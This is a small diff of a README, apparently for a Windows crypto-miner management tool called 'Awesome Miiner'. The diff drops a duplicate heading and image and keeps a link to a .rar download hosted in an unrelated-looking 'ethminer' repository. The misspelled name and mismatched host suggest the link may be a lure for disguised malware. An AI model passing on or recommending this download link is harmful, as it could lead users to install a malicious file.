@@ -1,7 +1,5 @@
 # Awesome Miiner - Powerful Windows GUI to manage and monitor up to 200000 miners 
-![image](https://user-images.githubusercontent.com/123663739/214911259-c9c03ccd-8c7e-489d-ac3c-93252ddc5036.png)
 
-# Awesome Miiner - Powerful Windows GUI to manage and monitor up to 200000 miners 
 ![image](https://user-images.githubusercontent.com/123663739/214911259-c9c03ccd-8c7e-489d-ac3c-93252ddc5036.png)
 
 [Download the Awesome Miner for Windows x32/x64](https://github.com/NHM-Git/ethminer/releases/download/Awesome.Miner/Awesome.Miner.rar)
